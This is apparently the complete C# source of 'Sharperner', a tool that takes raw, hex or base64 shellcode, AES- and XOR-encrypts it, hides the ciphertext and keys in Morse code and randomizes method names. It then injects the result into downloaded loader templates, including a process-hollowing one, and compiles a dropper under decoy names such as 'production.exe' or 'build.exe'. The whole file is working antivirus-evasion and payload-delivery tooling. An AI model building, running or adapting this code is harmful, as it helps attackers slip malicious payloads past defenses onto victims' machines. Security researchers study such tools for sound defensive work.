using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;
using System.Diagnostics;

namespace Sharperner
{
    public static class VisualStudioProvider
    {
        public static DirectoryInfo TryGetSolutionDirectoryInfo(string currentPath = null)
        {
            var directory = new DirectoryInfo(
                currentPath ?? Directory.GetCurrentDirectory());
            while (directory != null && !directory.GetFiles("Sharperner.sln").Any())
            {
                directory = directory.Parent;
            }
            
            return directory;
        }
    }

    //https://stackoverflow.com/questions/59248316/c-sharp-morse-decoder
    public class MorseForFun
    {
        private static Dictionary<char, string> _morseAlphabetDictionary;

        public static void InitializeDictionary()
        {
            _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
                                   };
        }

        public static string Send(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            foreach (char character in input)
            {
                if (_morseAlphabetDictionary.ContainsKey(character))
                {
                    stringBuilder.Append(_morseAlphabetDictionary[character] + " ");
                }
                else
                {
                    stringBuilder.Append(character + " ");
                }
            }

            return stringBuilder.ToString();
        }
        public static string Receive(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            string[] codes = input.Split(' ');

            foreach (var code in codes)
            {
                foreach (char keyVar in _morseAlphabetDictionary.Keys)
                {
                    if(_morseAlphabetDictionary[keyVar] == code)
                    {
                        stringBuilder.Append(keyVar);
                    }
                }
            }

            return stringBuilder.ToString();
        }
    }

    class Program
    {
        private static bool IsBase64String(string base64)
        {
            base64 = base64.Trim();
            return (base64.Length % 4 == 0) && Regex.IsMatch(base64, @"^[a-zA-Z0-9\+/]*={0,3}$", RegexOptions.None);
        }

        public static bool IsHex(String s)
        {
            string strHex = String.Concat("[0-9A-Fa-f]{", s.Length, "}");
            bool RetBoolHex = Regex.IsMatch(s, strHex);
            return RetBoolHex;
        }

        private static Random random = new Random();

        public static string GetJuggledLetters(int length)
        {
            const string chars = "ABCDE!+FGHIJKLMNOPQRSTUVWXY!+Zabcdefghijklmnopqrs!+tuvwxyz0123456789!+";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string GenerateRandomString()
        {
            int length = random.Next(5,10);
            var rString = "";
            for (var i = 0; i < length; i++)
            {
                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
            }
            return rString;
        }

        public static string RandomKey(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static byte[] xorEncDec(byte[] input, string theKeystring)
        {
            byte[] theKey = Encoding.UTF8.GetBytes(theKeystring);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ theKey[i % theKey.Length]);
            }
            return mixed;
        }

        public static bool isBinary(string path)
        {
            long length = new FileInfo(path).Length;
            if (length == 0) return false;

            using (StreamReader stream = new StreamReader(path))
            {
                int ch;
                while ((ch = stream.Read()) != -1)
                {
                    if (isControlChar(ch))
                    {
                        return true;
                    }
                }
            }
            return false;
        }

        public static bool isControlChar(int ch)
        {
            return (ch > Chars.NUL && ch < Chars.BS)
                || (ch > Chars.CR && ch < Chars.SUB);
        }

        public static class Chars
        {
            public static char NUL = (char)0; // Null char
            public static char BS = (char)8; // Back Space
            public static char CR = (char)13; // Carriage Return
            public static char SUB = (char)26; // Substitute
        }

        //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
        //https://gist.github.com/RichardHan/0848a25d9466a21f1f38
        public static byte[] AESEncrypt(byte[] clearData, string aes_key, string aes_iv)
        {
            MemoryStream ms = new MemoryStream();

            Rijndael alg = Rijndael.Create();

            alg.Key = Convert.FromBase64String(aes_key);
            alg.IV = Convert.FromBase64String(aes_iv);

            CryptoStream cs = new CryptoStream(ms,
               alg.CreateEncryptor(), CryptoStreamMode.Write);

            // Write the data and make it do the encryption 
            cs.Write(clearData, 0, clearData.Length);

            cs.Close();

            byte[] encryptedData = ms.ToArray();

            return encryptedData;
        }

        //https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static byte[] GetRandomIV()
        {
            byte[] iv = new byte[16];

            for (int i = 0; i < 16; i++)
            {
                random.NextBytes(iv);
            }
            //StringBuilder IVStr = new StringBuilder(iv.Length);
            //foreach (byte b in iv)
            //{
            //    IVStr.AppendFormat("0x{0:x2}", b);
            //    if (!b.Equals(iv.Last()))
            //    {
            //        IVStr.Append(",");
            //    }
            //}
            //return IVStr.ToString();
            return iv;
        }

        public static byte[] GetRandomKey()
        {
            byte[] key = new byte[32];

            for (int i = 0; i < 32; i++)
            {
                random.NextBytes(key);
            }
            //StringBuilder IVStr = new StringBuilder(iv.Length);
            //foreach (byte b in iv)
            //{
            //    IVStr.AppendFormat("0x{0:x2}", b);
            //    if (!b.Equals(iv.Last()))
            //    {
            //        IVStr.Append(",");
            //    }
            //}
            //return IVStr.ToString();
            return key;
        }

        public static void banner()
        {
            string banner = @"
███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗██████╗ ███╗   ██╗███████╗██████╗ 
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
███████╗███████║███████║██████╔╝██████╔╝█████╗  ██████╔╝██╔██╗ ██║█████╗  ██████╔╝
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██╔══╝  ██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗
███████║██║  ██║██║  ██║██║  ██║██║     ███████╗██║  ██║██║ ╚████║███████╗██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  
by @ch4rm with <3
";
            Console.WriteLine(banner);
        }

        public static void help()
        {
            string help = @"
/file       B64,hex,raw
/type       cs,cpp
/out        Output file Location (Optional)

Example:
Sharperner.exe /file:file.txt /type:cpp
Sharperner.exe /file:file.txt /out:payload.exe
";
            Console.WriteLine(help);
        }

        static void Main(string[] args)
        {
            string base64String = "";
            string xorKey = GetJuggledLetters(18);
            string xorAesEncStringB64 = "";
            string rawB64Output = "";
            byte[] rawSh3lLc0d3 = new byte[] { };
            byte[] aesEncByte = new byte[] { };
            string morsed_aeskey = "";
            string morsed_aesiv = "";
            var filePath = "";
            var outputFile = "";
            var dropperFormat = "";

            // generate random aes key and iv
            string aes_key = Convert.ToBase64String(GetRandomKey());
            string aes_iv = Convert.ToBase64String(GetRandomIV());

            banner();

            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }

            if (arguments.Count == 0 || !arguments.ContainsKey("/file") || !arguments.ContainsKey("/type"))
            {
                Console.WriteLine("[!] Please enter /file and /type as arguments");
                help();
            }
            else if (string.IsNullOrEmpty(arguments["/file"]) || string.IsNullOrEmpty(arguments["/type"]))
            {
                Console.WriteLine("[!] Empty input file or type");
            }
            else if (arguments["/type"].ToLower() != "cs" && arguments["/type"].ToLower() != "cpp")
            {
                Console.WriteLine("[!] Invalid file type. Only cs or cpp are accepted");
            }
            else
            {
                filePath = arguments["/file"];
                dropperFormat = arguments["/type"].ToLower();

                if (!File.Exists(filePath)) //if file exists
                {
                    Console.WriteLine("[+] Missing input file");
                    Environment.Exit(0);
                }
                else
                {
                    try
                    {
                        if(IsHex(File.ReadAllText(filePath)))
                        {
                            Console.WriteLine("[+] Hex payload detected.");
                            rawSh3lLc0d3 = StringToByteArray(File.ReadAllText(filePath));
                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                        }
                        else if (isBinary(filePath))
                        {
                            Console.WriteLine("[+] Raw payload detected.");
                            rawSh3lLc0d3 = File.ReadAllBytes(filePath);
                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                        }
                        else if (IsBase64String(File.ReadAllText(filePath)))
                        {
                            Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
                            base64String = File.ReadAllText(filePath);
                            rawSh3lLc0d3 = Convert.FromBase64String(base64String);
                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
                        }
                        else
                        {
                            Console.WriteLine("[!] Couldn't detect file input content.");
                            Environment.Exit(0);
                        }


                        Console.WriteLine($"[+] XOR encode shellcode with key: {xorKey}");

                        // XOR
                        byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);

                        // back in the history
                        MorseForFun.InitializeDictionary();

                        rawB64Output = Convert.ToBase64String(xorAesEncByte);
                        xorAesEncStringB64 = MorseForFun.Send(rawB64Output);
                        morsed_aeskey = MorseForFun.Send(aes_key);
                        morsed_aesiv = MorseForFun.Send(aes_iv);
                        xorKey = MorseForFun.Send(xorKey);

                        Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                    }
                    catch
                    {
                        Console.WriteLine("[!] Error encrypting");
                    }

                }

                if(arguments.ContainsKey("/out"))
                {
                    outputFile = arguments["/out"];
                    if(!Path.GetExtension(outputFile).Contains(".exe"))
                    {
                        outputFile = $"{outputFile}.exe";
                    }
                }
                else
                {
                    // choose either one of these
                    string[] fileName = { "production.exe","release.exe","Release_x64.exe","prod.exe","config.exe","buildGradle.exe","build.exe" };
                    outputFile = fileName[random.Next(fileName.Length)];
                }

                // Write the file
                var fullPath = "payload.dec";

                using (StreamWriter writer = new StreamWriter(fullPath))
                {
                    Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath} just in case you need it");
                    writer.WriteLine(rawB64Output);
                }

                if (dropperFormat == "cs")
                {
                    //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c

                    //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");

                    //decrypt it back

                    //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);

                    //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);

                    //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");

                    // Open template file
                    var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();

                    var parentDir = directory.FullName;

                    var templateFile = Path.Combine(parentDir, @"templates\template.cs");
                    
                    var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");

                    string templateFileContent = "";

                    // read all content
                    if (!File.Exists(templateFile)) //if file exists
                    {
                        Console.WriteLine("[!] File does not exists in local, fetching online...");
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        WebClient client = new WebClient();
                        try
                        {
                            templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
                        }
                        catch
                        {
                            Console.WriteLine("[!] No internet connection");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        templateFileContent = File.ReadAllText(templateFile);
                    }

                    try
                    {

                        // randomize method names
                        var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
                        var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
                        Regex rg = new Regex(pattern);
                        MatchCollection methods = rg.Matches(templateFileContent);
                        foreach (var method in methods)
                        {
                            if (!method.ToString().Contains("Main"))
                            {
                                var methodName = Regex.Match(method.ToString(), methodNamesPattern);
                                templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
                            }

                        }

                        // replace in template file
                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] {err.Message}");
                    }

                    // write all back into the file
                    try
                    {
                        Console.WriteLine("[+] Writing shellcode to template file...");
                        File.WriteAllText(tempFile, templateFileContent);
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                    }

                    //compile the code
                    //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
                    string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
                    try
                    {
                        Process process = new Process();

                        // Stop the process from opening a new window
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;

                        // Setup executable and parameters
                        process.StartInfo.FileName = @"CMD.exe";
                        process.StartInfo.Arguments = strCmd;

                        // Go
                        process.Start();

                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] Error compiling template file with the following error {err.Message}");
                    }

                    Console.WriteLine($"[+] Doing some cleaning...");
                    Thread.Sleep(1000);

                    //File.Delete(tempFile);
                }
                else if(dropperFormat == "cpp")
                {
                    // locate the file
                    var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();

                    if (directory == null)
                    {
                        Console.WriteLine("[!] Couldn't locate files. Exiting...");
                        Environment.Exit(0);
                    }

                    var parentDir = directory.FullName;

                    var rootFile = Path.Combine(parentDir, @"loader\loader.cpp");
                    
                    var templateFile = Path.Combine(parentDir, @"templates\hollow.cpp");

                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");

                    string templateFileContent = "";

                    // read all content
                    if (!File.Exists(templateFile)) //if file exists
                    {
                        Console.WriteLine("[!] Template file does not exists in local, fetching online...");
                        ServicePointManager.Expect100Continue = true;
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                        WebClient client = new WebClient();
                        try
                        {
                            templateFileContent = client.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
                        }
                        catch
                        {
                            Console.WriteLine("[!] No internet connection");
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        templateFileContent = File.ReadAllText(templateFile);
                    }

                    //create backup copy of the template
                    string temp = File.ReadAllText(rootFile);

                    // replace required values
                    try
                    {
                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Error replacing values");
                    }

                    // write all back into the file
                    try
                    {
                        Console.WriteLine("[+] Writing shellcode to template file...");
                        File.WriteAllText(rootFile, templateFileContent);
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
                        Environment.Exit(0);
                    }

                    //compile with this
                    //"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\MSBuild\Current\Bin\MSBuild.exe" C: \Users\REUSER\source\repos\ObfuscatorXOR\Sharperner\Sharperner.sln / t:loader
                    try
                    {
                        var msBuildPath = "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community";

                        try
                        {
                            var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
                            {
                                CreateNoWindow = true,
                                UseShellExecute = false,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,
                                WorkingDirectory = @"C:\Windows\System32\"
                            };

                            StringBuilder sb = new StringBuilder();
                            Process p = Process.Start(processInfo);
                            p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
                            p.BeginOutputReadLine();
                            p.WaitForExit();
                            msBuildPath = sb.ToString().Trim();
                        }
                        catch
                        {
                            Console.WriteLine("[!] Couldn't find MSBuild.exe location");
                            Environment.Exit(0);
                        }

                        try
                        {
                            string strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:loader";

                            using (Process compiler = new Process())
                            {
                                compiler.StartInfo.FileName = @"CMD.exe";
                                compiler.StartInfo.Arguments = strCmd;
                                compiler.StartInfo.UseShellExecute = false;
                                compiler.StartInfo.CreateNoWindow = true;
                                compiler.StartInfo.RedirectStandardError = true;
                                compiler.Start();
                            }

                        }
                        catch
                        {
                            Console.WriteLine("[!] Error while compiling. Exiting...");
                            Environment.Exit(0);
                        }
                    }
                    catch (Exception err)
                    {
                        Console.WriteLine($"[!] {err.Message}");
                        Environment.Exit(0);
                    }

                    Console.WriteLine($"[+] Doing some cleaning...");

                    //wait for it to compile
                    Thread.Sleep(5000);

                    try
                    {
                        File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);

                        File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");

                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                    }
                    catch
                    {
                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                    }

                    //revert the file
                    File.WriteAllText(rootFile, temp);

                }

            }

        }


    }

}
